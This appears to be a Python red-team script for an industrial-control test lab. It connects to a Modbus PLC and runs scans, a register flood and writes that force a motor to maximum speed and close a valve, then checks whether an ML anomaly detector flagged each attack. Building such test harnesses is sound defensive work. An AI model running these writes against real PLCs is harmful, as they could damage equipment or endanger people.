import os
import time
import json
import logging
import random
import requests
try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

TEST_PLC_IP = os.environ.get('TEST_PLC_IP', '10.5.0.10') # PLC-01 for testing
ML_ENGINE_URL = os.environ.get('ML_ENGINE_URL', 'http://ml-engine:8001')

class AttackGenerator:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.client = ModbusTcpClient(target_ip, port=502)

    def slow_scan(self):
        """Sequential reads with 1s delay (stealthy)"""
        for addr in range(0, 50, 5):
            self.client.read_holding_registers(addr, count=1)
            time.sleep(1.0)

    def fast_scan(self):
        """Rapid sequential reads"""
        for addr in range(0, 100):
            self.client.read_holding_registers(addr, count=1)
            time.sleep(0.01)

    def targeted_write(self):
        """Write to critical registers"""
        self.client.write_register(0, 100) # Force max speed
        self.client.write_register(2, 0)   # Close valve

    def register_flood(self):
        """High volume of random writes"""
        for _ in range(200):
            self.client.write_register(random.randint(0, 1000), random.randint(0, 65535))
            time.sleep(0.005)

    def function_code_fuzz(self):
        """Try unusual function codes"""
        for fc in [0x07, 0x08, 0x0B, 0x0C, 0x11, 0x14, 0x15, 0x17, 0x2B]:
            try:
                self.client.execute(None) # Simplified
            except: pass

    def run_template(self, template_name):
        logging.info(f"Running attack template: {template_name}")
        if not self.client.connect():
            logging.error(f"Failed to connect to {self.target_ip}")
            return
            
        if template_name == 'slow_scan': self.slow_scan()
        elif template_name == 'fast_scan': self.fast_scan()
        elif template_name == 'targeted_write': self.targeted_write()
        elif template_name == 'register_flood': self.register_flood()
        elif template_name == 'function_code_fuzz': self.function_code_fuzz()
        
        self.client.close()

def run_test_cycle():
    templates = ['slow_scan', 'fast_scan', 'targeted_write', 'register_flood', 'function_code_fuzz']
    gen = AttackGenerator(TEST_PLC_IP)
    
    results = []
    for t in templates:
        # 1. Run attack
        gen.run_template(t)
        
        # 2. Wait for monitor to capture and score
        time.sleep(5) 
        
        # 3. Check ML engine metrics for anomalies
        try:
            resp = requests.get(f"{ML_ENGINE_URL}/metrics")
            metrics = resp.json()
            # This is simplified; ideally we check if the specific sequence was detected
            results.append({
                "template": t,
                "detected": metrics.get("total_anomalies_flagged", 0) > 0,
                "timestamp": time.time()
            })
        except:
            results.append({"template": t, "detected": False, "error": True})
            
    return results

if __name__ == "__main__":
    REDIS_HOST = os.environ.get('REDIS_HOST', 'redis')
    try:
        import redis
        r = redis.Redis(host=REDIS_HOST, port=6379, db=0)
    except ImportError:
        r = None
        logging.warning("Redis library not found, red-team will run regardless of simulation state.")

    while True:
        # Check if simulation is active via Redis
        is_active = False
        if r:
            try:
                active_session = r.get("shadow-ot:active-session")
                if active_session:
                    is_active = True
                    logging.info(f"Active simulation detected: {active_session.decode('utf-8')}")
                else:
                    logging.debug("No active simulation. Red-team idling...")
            except Exception as e:
                logging.error(f"Redis connection error: {e}")
        else:
            is_active = True # Fallback if no redis

        if is_active:
            results = run_test_cycle()
            logging.info(f"Test cycle complete: {results}")
            time.sleep(60) # Shorter sleep when active to allow for more simulation data
        else:
            time.sleep(5) # Poll every 5 seconds for simulation start

